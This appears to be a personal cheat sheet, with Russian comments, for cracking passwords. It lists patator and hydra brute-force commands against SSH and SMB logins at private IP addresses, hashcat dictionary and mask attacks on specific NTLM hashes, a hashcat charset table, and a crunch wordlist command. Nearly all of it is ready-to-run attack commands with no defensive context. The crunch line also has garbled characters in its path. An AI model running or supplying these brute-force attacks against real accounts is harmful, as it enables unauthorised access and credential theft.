

Перебор хешей по словарю

patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’


hashcat -m 1000 hash.txt dict.txt
hashcat ujas.txt rockyou.txt - автодетектинг хеша (файл может быть с хламом)


Загляним в справку Hashcat, чтобы узнать номер режима хеша NTLM: 1000 | NTLM  


Брут хешей
hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 -1 ?l?u?d FB6CEDE76A37702EAD2615DC27B626EF ?1?1?1?1?1?1?1?1?1?1?1?1?1



hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 --increment-max 12 6A6E1BB24F869966A450203F373C8EA6 ?a?a?a?a?a?a?a?a
 -a  атака по словарю 0, брутфорс 3



 
  В Hashcat встроенными наборами символов являются:	
? | Набор символов
===+=========
 l | abcdefghijklmnopqrstuvwxyz
 u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
 d | 0123456789
 h | 0123456789abcdef
 H | 0123456789ABCDEF
 s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
 
 a | ?l?u?d?s
 b | 0x00 - 0xff


patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’


hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"

smbclient -L 192.168.50.200 -U Administrator


Brute char!!!! -x min:max:Aa1%

hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V


Создание паролей
	crunch 6 8 1234567890 -о /гооt/wordlist.lst:

https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
